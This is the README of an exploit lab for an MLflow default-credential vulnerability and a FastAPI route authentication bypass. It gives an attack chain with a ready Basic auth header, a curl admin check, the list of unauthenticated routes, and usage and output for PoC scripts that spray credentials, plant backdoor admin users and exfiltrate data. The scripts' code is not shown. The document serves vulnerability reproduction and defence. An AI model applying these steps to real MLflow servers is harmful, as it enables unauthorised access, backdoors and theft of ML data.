# CVE-2026-2635 - MLflow Authentication Bypass via Default Credentials

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2026-2635 |
| Component | [MLflow](https://github.com/mlflow/mlflow) (basic-auth module) |
| Type | CWE-1393: Use of Default Credentials |
| CVSS | 9.8 (Critical) — `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| EPSS | 1.4% (80.1th percentile) |
| Affected | v2.3.0 – v3.10.0+ (all versions with `--app-name basic-auth`) |
| Fix | None — default credentials `admin`/`password1234` remain in codebase as of v3.10.0 |
| ZDI | [ZDI-26-111](https://www.zerodayinitiative.com/advisories/ZDI-26-111/) / ZDI-CAN-28256 |
| Researcher | Peter Girnus (@gothburz), Trend Zero Day Initiative |
| Author | Exploit Intelligence Platform |
| Date | 2026-02-28 |

## Vulnerability Details

MLflow ships with **hardcoded default administrator credentials** (`admin`/`password1234`) in `mlflow/server/auth/basic_auth.ini`. When the tracking server is started with authentication enabled (`--app-name basic-auth`), an admin account is silently created using these well-known credentials with no mechanism to force a password change.

```ini
[mlflow]
default_permission = READ
database_uri = sqlite:///basic_auth.db
admin_username = admin
admin_password = password1234
authorization_function = mlflow.server.auth:authenticate_request_basic_auth
```

This file is distributed as part of the `mlflow` Python package, meaning **every MLflow installation worldwide ships with identical default credentials**. Once authenticated as admin, all authorization checks are bypassed (`if sender_is_admin(): return`), granting unrestricted access to every API endpoint.

### Credential History

| Version Range | Default Password |
|---|---|
| v2.3.0 – v2.21.x | `password` |
| v2.22.0 – v3.10.0+ | `password1234` |

### Attack Chain

```
1. Recon: GET /api/2.0/mlflow/experiments/search (unauthenticated) — confirm 401 (auth enabled)
2. Login: Any request with Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM0 (admin:password1234)
3. Confirm: GET /api/2.0/mlflow/users/get?username=admin — verify is_admin: true
4. Escalate: POST /api/2.0/mlflow/users/create — create backdoor admin user
5. Persist: attacker retains access even if original admin password is changed
```

### Attack Scenarios

- **ML Supply Chain Poisoning**: Create rogue experiments, inject poisoned model artifacts that propagate downstream through ML pipelines
- **Data Exfiltration**: Read all experiments, runs, registered models, and artifacts — proprietary ML data theft
- **Account Takeover**: Change the admin password, lock out legitimate users, create persistent backdoor accounts
- **Full Denial of Service**: Delete all experiments, models, and user accounts

## Bypass Finding: FastAPI Route Authentication Bypass

During analysis, a **separate authentication bypass** was discovered affecting FastAPI routes in MLflow v2.22.0 – v3.9.x. Even when the default admin password is changed (the recommended mitigation), multiple FastAPI API endpoints remain **completely unauthenticated**.

### Root Cause

The FastAPI permission middleware `_find_fastapi_validator()` only handles `/gateway/` routes — all other FastAPI routes return `validator=None`, causing the middleware to pass requests through without authentication:

```python
def _find_fastapi_validator(path):
    if path.startswith("/gateway/"):
        return _get_gateway_validator(path)
    return None   # <-- ALL other FastAPI routes pass through!
```

### Bypassed Routes

| Route | Method | Impact |
|---|---|---|
| `/ajax-api/3.0/jobs/search` | POST | Job enumeration — information disclosure |
| `/ajax-api/3.0/jobs/` | POST | Job submission — potential code execution |
| `/ajax-api/3.0/jobs/{id}` | GET | Job detail retrieval — information disclosure |
| `/ajax-api/3.0/jobs/cancel/{id}` | PATCH | Job cancellation — availability impact |
| `/v1/traces` | POST | OTEL trace injection — data integrity impact |

### Fix Status

The FastAPI bypass was fixed in v3.10.0 (commit `0b15c3ca5`, PR [#20920](https://github.com/mlflow/mlflow/pull/20920)). However, **v3.10.0 still ships with default credentials** (`admin`/`password1234`), so CVE-2026-2635 itself remains unpatched.

| Version | Default Credentials | FastAPI Auth Bypass |
|---|---|---|
| v2.3.0 – v2.21.x | Vulnerable (`admin`/`password`) | N/A (no FastAPI routes) |
| v2.22.0 – v3.9.x | Vulnerable (`admin`/`password1234`) | Vulnerable |
| v3.10.0+ | Vulnerable (`admin`/`password1234`) | Fixed (PR #20920) |

## Lab Setup

### Architecture

```
┌────────────────────────────────────────────────────────────────┐
│  lab-net (bridge)                                              │
│                                                                │
│  ┌──────────────────────────┐                                 │
│  │ cve-2026-2635-vulnerable │  MLflow v3.9.0 + basic-auth    │
│  │ Port: 5000 (host: 15000)  │  Default creds: admin/pass1234 │
│  └──────────────────────────┘                                 │
│                                                                │
│  ┌──────────────────────────┐                                 │
│  │ cve-2026-2635-patched    │  MLflow v3.9.0 + random pass   │
│  │ Port: 5000 (host: 15001)  │  For bypass testing             │
│  └──────────────────────────┘                                 │
│                                                                │
│  ┌──────────────────────────┐                                 │
│  │ cve-2026-2635-v310       │  MLflow v3.10.0 + basic-auth   │
│  │ Port: 5000 (host: 15002)  │  FastAPI fix applied            │
│  └──────────────────────────┘                                 │
└────────────────────────────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2026-2635

# Build and start all three containers
docker compose build
docker compose up -d

# Wait ~30s for MLflow initialization
sleep 30

# Run the primary PoC against the vulnerable container
python3 poc/poc.py localhost 15000

# Run the bypass PoC against the patched container (password changed)
python3 poc/bypass_poc.py localhost 15001

# Cleanup
docker compose down -v
```

### Container Details

| Container | Role | Base | Host Port | Description |
|---|---|---|---|---|
| `cve-2026-2635-vulnerable` | Vulnerable target | `python:3.10-slim-bullseye` | `15000` | MLflow v3.9.0, default credentials |
| `cve-2026-2635-patched` | Patched (password changed) | `python:3.10-slim-bullseye` | `15001` | MLflow v3.9.0, random admin password |
| `cve-2026-2635-v310` | Latest release | `python:3.10-slim-bullseye` | `15002` | MLflow v3.10.0, FastAPI fix applied |

### Default Credentials

| Service | Username | Password |
|---|---|---|
| MLflow (vulnerable) | `admin` | `password1234` |
| MLflow (patched) | `admin` | Random (written to `/mlflow/.admin_password` in container) |
| MLflow (v3.10) | `admin` | `password1234` |

## PoC Usage

Four PoC scripts are provided, all using **Python 3 stdlib only** (no external dependencies).

### PoC 1: Default Credential Authentication Bypass (`poc.py`)

The primary exploit. Authenticates with default credentials, confirms admin access, demonstrates data access, and creates a backdoor admin user.

```bash
python3 poc/poc.py <host> [port]

# Against the lab
python3 poc/poc.py localhost 15000
```

### Expected Output (Vulnerable)

```
[Step 1] Checking if authentication is enabled ...
  [OK]   Server returned HTTP 401 — authentication is enforced

[Step 2] Attempting authentication with default credentials ...
         Username: admin
         Password: password1234
  [OK]   HTTP 200 — Authentication successful with default credentials!

[Step 3] Verifying admin-level access ...
  [OK]   Confirmed admin access!
         User ID:   1
         Username:  admin
         is_admin:  True

[Step 4] Demonstrating data access — listing experiments ...
  [OK]   Retrieved 1 experiment(s)

[Step 5] Demonstrating privilege escalation — creating a new user ...
  [OK]   Created user 'cve_2026_2635_poc' — persistent backdoor established
  [OK]   Cleanup successful — PoC user deleted

[VULNERABLE] CVE-2026-2635 confirmed — 6/6 checks passed
```

### PoC 2: Persistence and Full Compromise (`poc_vector2.py`)

Demonstrates the full attack chain: backdoor creation, data exfiltration, rogue experiment injection (ML supply chain risk), and admin account hijacking.

```bash
python3 poc/poc_vector2.py <host> [port]
```

### PoC 3: Credential Discovery and Version Fingerprinting (`poc_vector3.py`)

Sprays all known historical default credentials and fingerprints the MLflow version based on which password is accepted.

```bash
python3 poc/poc_vector3.py <host> [port]
```

### PoC 4: FastAPI Route Authentication Bypass (`bypass_poc.py`)

Demonstrates the FastAPI auth bypass — works even when the default admin password has been changed. Run against the `patched` container (port 5001) to show it bypasses the password fix.

```bash
python3 poc/bypass_poc.py <host> <port>

# Against the patched container
python3 poc/bypass_poc.py localhost 15001
```

### Quick Manual Verification (curl)

```bash
# One-liner to confirm the vulnerability
curl -u admin:password1234 http://localhost:15000/api/2.0/mlflow/users/get?username=admin
```

A `200` response with `"is_admin": true` confirms the vulnerability.

## Verification: Vulnerable vs Patched

| Step | Vulnerable (v3.9.0, default) | Patched (v3.9.0, pwd changed) | v3.10.0 |
|---|---|---|---|
| `curl -u admin:password1234 .../users/get` | `200` — admin JSON | `401` — rejected | `200` — still vulnerable |
| Flask API (no auth) | `401` | `401` | `401` |
| Jobs API (no auth) | `200` — bypass | `200` — **bypass** | `401` — fixed |
| OTEL traces (no auth) | `400` — bypass | `400` — **bypass** | `401` — fixed |
| Repeated exploitation | Unlimited | N/A | Unlimited (default creds) |

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary PoC — default credential auth bypass + admin verification |
| `poc/poc_vector2.py` | Vector 2 — persistence, exfiltration, integrity and availability impact |
| `poc/poc_vector3.py` | Vector 3 — credential spray, version fingerprinting |
| `poc/bypass_poc.py` | Bypass PoC — unauthenticated FastAPI route access |
| `Dockerfile.vulnerable` | MLflow v3.9.0 with default credentials |
| `Dockerfile.patched` | MLflow v3.9.0 with randomized admin password |
| `Dockerfile.v3.10` | MLflow v3.10.0 (FastAPI fix applied, default creds remain) |
| `docker-compose.yml` | All three containers orchestration |
| `intel_brief.md` | CVE intelligence brief |
| `vulnerability_analysis.md` | Root cause analysis |
| `bypass_analysis.md` | FastAPI auth bypass analysis and test results |
| `lab_build_report.md` | Lab build documentation |
| `poc_verification_report.md` | PoC test results |

## References

- [ZDI Advisory ZDI-26-111](https://www.zerodayinitiative.com/advisories/ZDI-26-111/)
- [GitHub PR #19260](https://github.com/mlflow/mlflow/pull/19260) (referenced by CVE — addresses different vuln)
- [FastAPI Fix PR #20920](https://github.com/mlflow/mlflow/pull/20920)
- [Vulnerable Config File](https://github.com/mlflow/mlflow/blob/v3.9.0/mlflow/server/auth/basic_auth.ini)
- [Password Change Commit](https://github.com/mlflow/mlflow/commit/1f74f3f24d8273927b8db392c23e108576936c54) (not a security fix)
- [Auth Feature PR #8130](https://github.com/mlflow/mlflow/pull/8130)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2026-2635)
- [MLflow Repository](https://github.com/mlflow/mlflow)

## Timeline

| Date | Event |
|---|---|
| April 2023 | MLflow basic auth introduced in v2.3.0 with default credentials `admin`/`password` (PR #8130) |
| April 2025 | Default password changed to `password1234` in v2.22.0 (PR #15287) — not a security fix |
| 2026-02-18 | FastAPI auth fix committed (`0b15c3ca5`, PR #20920) |
| 2026-02-20 | CVE-2026-2635 published; ZDI-26-111 released |
| 2026-02-28 | Lab reproduction, PoC verification, and bypass discovery completed |
| 2026-02-28 | No upstream fix for default credentials as of v3.10.0 |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2026-2635 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
